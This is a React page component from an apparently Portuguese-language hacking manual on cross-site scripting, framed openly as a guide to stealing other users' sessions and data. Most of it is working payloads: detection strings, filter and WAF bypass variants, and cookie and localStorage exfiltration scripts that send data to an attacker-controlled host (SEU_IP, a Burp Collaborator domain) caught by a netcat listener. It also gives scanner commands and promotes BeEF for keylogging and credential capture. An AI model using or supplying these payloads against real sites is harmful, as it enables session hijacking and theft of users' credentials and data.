import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function XSSManual() {
    return (
      <PageContainer
        title="XSS — Cross-Site Scripting Manual"
        subtitle="Injete e execute JavaScript malicioso no navegador de outros usuários para roubar sessões, credenciais e dados."
        difficulty="intermediario"
        timeToRead="16 min"
      >
        <AlertBox type="warning" title="Impacto crítico">
          XSS pode roubar cookies de sessão, executar ações em nome do usuário, redirecionar para phishing,
          e em casos avançados comprometer toda a aplicação.
        </AlertBox>

        <h2>Tipos de XSS</h2>
        <CodeBlock language="bash" code={'# 1. Reflected XSS (não persistente)\n# Payload na URL, refletido na resposta imediatamente\n# https://app.com/search?q=<script>alert(1)</script>\n\n# 2. Stored XSS (persistente — mais perigoso)\n# Payload salvo no banco de dados e exibido para todos os usuários\n# Ex: comentário malicioso em blog, perfil de usuário\n\n# 3. DOM-based XSS\n# Manipulação do DOM via JavaScript do lado cliente\n# document.location.hash, document.URL, innerHTML'} />

        <h2>Payloads Básicos de Detecção</h2>
        <CodeBlock language="bash" code={'# Teste simples\n<script>alert(1)</script>\n<script>alert(\'XSS\')</script>\n\n# Em imagens\n<img src=x onerror=alert(1)>\n<img src=x onerror=alert(document.domain)>\n\n# Em eventos HTML\n<body onload=alert(1)>\n<svg onload=alert(1)>\n<input autofocus onfocus=alert(1)>\n\n# Sem tags script (bypass de filtros básicos)\n<a href=javascript:alert(1)>clique aqui</a>\n<a href="javascript:alert(1)">XSS</a>'} />

        <h2>Bypass de Filtros</h2>
        <CodeBlock language="bash" code={'# Maiúsculas/minúsculas\n<ScRiPt>alert(1)</ScRiPt>\n<SCRIPT>alert(1)</SCRIPT>\n\n# Encodings\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>\n\n# HTML entities\n&lt;script&gt;alert(1)&lt;/script&gt;\n\n# Quebra de palavra-chave\n<scr<script>ipt>alert(1)</scr</script>ipt>\n\n# SVG XML\n<svg><script>alert(1)</script></svg>\n\n# Atributos JS sem aspas\n<img src=x onerror=alert\'XSS\'>\n\n# Newlines em atributos (WAF bypass)\n<img src=x\nonerror=alert(1)>'} />

        <h2>Roubo de Cookies (Session Hijacking)</h2>
        <CodeBlock language="bash" code={'# 1. Configurar servidor receptor\nnc -lvnp 8080\n# ou\npython3 -m http.server 8080\n\n# 2. Payload para roubar cookie\n<script>new Image().src=\'http://SEU_IP:8080/?c=\'+document.cookie;</script>\n<img src=x onerror="fetch(\'http://SEU_IP:8080/?c=\'+document.cookie)">\n\n# 3. Roubar localStorage\n<script>\n  fetch(\'http://SEU_IP:8080/?\'\n    +encodeURIComponent(JSON.stringify(localStorage)));\n</script>'} />

        <h2>XSS com Burp Suite Collaborator</h2>
        <CodeBlock language="bash" code={'# Usar Burp Collaborator para detectar XSS cego (Blind XSS)\n# Ativar Burp Collaborator: Burp > Collaborator client\n\n# Payload com Collaborator\n<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open(\'GET\',\'http://SEU.burpcollaborator.net/?c=\'+document.cookie);\n  xhr.send();\n</script>\n\n# XSSHunter (alternativa gratuita)\n# https://xsshunter.trufflesecurity.com/'} />

        <h2>Ferramentas para XSS</h2>
        <CodeBlock language="bash" code={'# dalfox — scanner XSS automatizado\nsudo apt install dalfox -y\ndalfox url "https://app.com/?q=FUZZ"\ndalfox url "https://app.com/?q=FUZZ" --deep-domxss\n\n# XSStrike\ngit clone https://github.com/s0md3v/XSStrike\npip3 install -r XSStrike/requirements.txt\npython3 XSStrike/xsstrike.py -u "https://app.com/?q=test"\n\n# Burp Suite Scanner (ativo)\n# Enviar requisição para o scanner do Burp'} />

        <AlertBox type="success" title="BeEF — Exploração avançada de XSS">
          O Browser Exploitation Framework (BeEF) permite controlar navegadores comprometidos por XSS.
          Com ele você pode: capturar teclas, fazer screenshot, roubar credenciais via formulários falsos,
          escanear a rede interna do usuário, e muito mais. Veja a página dedicada ao BeEF.
        </AlertBox>
      </PageContainer>
    );
  }
  